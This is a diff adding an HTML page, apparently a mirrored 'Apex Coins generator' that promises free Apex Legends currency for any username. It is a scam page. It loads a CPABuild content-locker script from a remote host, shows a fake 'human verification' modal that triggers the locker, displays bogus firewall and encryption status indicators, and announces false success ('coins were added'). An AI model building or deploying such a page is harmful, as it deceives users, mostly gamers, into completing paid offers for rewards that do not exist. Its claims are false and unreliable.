@@ -1,0 +1,269 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+  
+<head>
+    <meta charset="UTF-8"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+    <meta http-equiv="X-UA-Compatible" content="ie=edge"/>
+
+ <!-- Place this data between the <head> tags of your website -->
+    <title>Apex Legends - A Simple Online Generator Tool</title>		
+ <!-- Place this data between the <head> tags of your website -->
+<meta name="description" content="A Simple Online Generator Tool." />
+<meta property="og:description" content="A Simple Online Generator Tool." /> 
+
+<link rel="icon" type="image/png" href="favicon-32x32.png" sizes="32x32" />
+<link rel="icon" type="image/png" href="favicon-16x16.png" sizes="16x16" />
+
+
+
+<meta name="robots" content="noindex">
+
+    <link rel="stylesheet" href="css/_bower.css"/>
+    <link rel="stylesheet" href="css/style.css"/>
+	
+	
+	
+	
+	
+	........................................
+	
+	
+	<script type="text/javascript">
+    var CPABUILDSETTINGS={"it":1415813,"key":"f906b"};
+</script>
+<script src="https://d13nu0oomnx5ti.cloudfront.net/0b309a9.js"></script>
+	
+	
+	....................................
+	
+	
+	
+	
+  </head>
+  <body data-bind="css: { 'modal-open': overlay() }">
+  
+ 
+    <div id="overlay" data-bind="css: { show: overlay() }"></div>
+    <div class="center-modal" id="confirm-modal" data-bind="css: { show: confirmModal() }">
+      <div class="inside"><img class="icon" src="img/confirm-icon.png"/>
+        <h3>Confirm</h3>
+        <p>Please confirm that the items below are correct.</p>
+        
+		<ul class="items-list">
+		
+		
+		          <li>
+
+            <div class="img"><img src="img/user.png" /></div>
+            <div class="right">
+              <p class="name" >Username</p>
+              <p class="amount"><span id="userid"/></p>
+            </div>            
+          </li>
+		
+		          <li>
+
+					<div class="img"><img src="img/platform.png" /></div>
+            <div class="right">
+              <p class="name" >Platform</p>
+             <p class="amount"><span id="platform"/></p>
+            </div>
+          </li>
+		
+           <li>
+
+            <div class="img"><img src="img/gold-icon.png" /></div>
+            <div class="right">
+              <p class="name" >Apex Coins</p>
+              <p class="amount"><span id="resources1"/></p>
+            </div>            
+			<!--<div class="img"><img src="img/chip-icon.png" /></div>
+            <div class="right">
+              <p class="name" >Credits</p>
+             <p class="amount"><span id="resources2"/></p>
+            </div> -->
+          </li>
+        </ul>
+        <div class="row">
+          <div class="col-xs-6">
+            <button class="btn btn-sm btn-default btn-block" data-bind="click: cancelConfirmModal">Cancel</button>
+          </div>
+
+          <div class="col-xs-6">
+            <button class="btn btn-sm btn-success btn-block" data-bind="click: confirmItems">Confirm</button>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="center-modal" id="loading-modal" data-bind="css: { show: loadingModal() }">
+      <div class="inside">
+        <div class="loader"></div>
+        <h3>Processing...</h3>
+        <p>Please wait while we are processing your request...</p>
+        <div class="progress">
+          <div class="progress-bar progress-bar-success" data-bind="style: { width: progressPercentage() }"></div>
+        </div>
+      </div>
+    </div>
+    <div class="new-modal" id="human-modal" data-bind="css: { show: humanModal() }">
+      <div class="inside">
+        <div class="loader"></div>
+        <h3>Verification</h3>
+        <p>Unfortunetly due to the high demand of our service we are experiencing some network issues. We now require all users to do a verification.</p>
+		
+				  <button onclick="CPABuildLock()"><span style="background-color: lime; font-size: large;">Verify</span></button>
+
+</iframe>		
+      </div>
+    </div>
+	
+    <div class="center-modal" id="human-modal" data-bind="css: { show: successModal() }">
+      <div class="inside">
+	  
+	  <div class="checkmark-circle">
+  <div class="background"></div>
+  <div class="checkmark draw"></div>
+</div>
+<center><img class="imagem" src="img/success_icon_32.png"></center>
+	   <h3>Success!</h3>
+        <p>You successfully completed the human verification. The apex coins were added to your account.</p>
+        <p><b>Enjoy!</b></p>
+      </div>
+    </div>
+	
+	
+	
+	
+    <header>
+	
+	
+	
+<script type="text/javascript">	window.onbeforeunload = null;</script>
+
+
+
+
+
+
+
+      <div class="container">
+        <div class="row">
+          <div class="col-md-6 col-md-offset-3">
+		  <img class="app-icon" src="img/app-icon.png"/>
+            <h1>Apex Legends</h1>
+            <p class="sub">A Simple Online Generator Tool.</p>
+          </div>
+        </div>
+      </div>
+    </header>
+	
+	
+    <div id="updates">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-8 col-md-offset-2">
+            <div class="inside">
+              <h3 id="update-msg" data-bind="html: updateMsg"><noscript>Please enable JavaScript to use the generator!</noscript></h3>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div id="generator">
+      <div class="container">
+        <div class="row">
+          <div class="col-md-8 col-md-offset-2">
+            <div class="inside">
+              <h2>Generate Apex Coins!</h2>
+              <p class="sub">Enter your username, select the platform and the amount of apex coins, and click "Generate" to start!</p>
+              <hr/>
+              <div class="row">
+                <div class="col-md-8 col-md-offset-2 text-left">
+                  <div class="form-group">
+				  <label><img src="img/user.png" height="15px" style="margin-right: 5px"/><span>Username:</span></label>
+                    <input class="form-control" id="inputUserid" type="text" placeholder="Enter your username..." data-bind="textInput: username"/>
+                  </div>
+				  
+				  
+				  
+	  <div class="form-group">
+				  <label><img src="img/platform.png" height="15px" style="margin-right: 5px"/><span>Platform:</span></label>
+				   <select id="inputPlatform" class="form-control" >
+                        <option>PC</option>
+                        <option>PS4</option>
+                        <option>XBOX ONE</option>
+                    </select>
+					 				  
+				</div>
+                  <div class="resources">
+                    <div class="form-group">
+                      <label><img src="img/gold-icon.png" height="15px" style="margin-right: 5px"/><span>Apex Coins:</span></label>
+  <select class="form-control" id="inputResources1">
+                        <option>1,000</option>
+                        <option >2,150</option>
+                        <option selected>4,350</option>
+                     </select>
+                    </div>
+					
+				<!--	     <div class="form-group">
+                      <label><img src="img/chip-icon.png" height="15px" style="margin-right: 5px"/><span>Credits:</span></label>
+  <select class="form-control" id="inputResources2">
+                        <option>9,999</option>
+                        <option>25,000</option>
+                        <option>50,000</option>
+                        <option>100,000</option>
+                        <option>250,000</option>
+                        <option>500,000</option>
+                        <option selected="selected">999,999</option>
+                     </select>
+                    </div>
+					-->
+					
+					
+                  </div>
+                  <button class="btn btn-lg btn-success btn-block" data-bind="attr: { disabled: !generatorReady() }, click: startGenerator">Generate</button><br class="clearfix"/>
+				  
+
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <footer>
+      <div class="container">
+        <div class="row">
+          <div class="col-md-12">
+            <ul class="status-list">
+              <li><img class="icon" src="img/server-icon.png"/>
+                <p class="name">Network</p>
+                <p style="background-color: orange;" class="status">Running</p>
+              </li>
+              <li><img class="icon" src="img/firewall-icon.png"/>
+                <p class="name">Firewall</p>
+				                <p class="status">Running</p>
+
+              </li>
+              <li><img class="icon" src="img/encryption-icon.png"/>
+                <p class="name">Encryption</p>
+                <p class="status">Running</p>
+              </li>
+            </ul>
+          </div>
+        </div>
+        <div class="row">
+          <div class="col-md-12">
+            <p>&copy; Copyright <span id="yearspan"></span> - <a  style="color: white;" target="_blank" href="http://generator.tools/">Generator.Tools</a></p>
+			<p></p>
+          </div>
+        </div>
+      </div>
+    </footer>
+    <script type="text/javascript" src="js/_bower.js"></script>
+    <script type="text/javascript" src="js/scripts.js"></script>
+</body>
+
+<!-- Mirrored from apex.generator.tools/ by HTTrack Website Copier/3.x [XR&CO'2014], Fri, 16 Aug 2019 23:07:14 GMT -->
+</html>
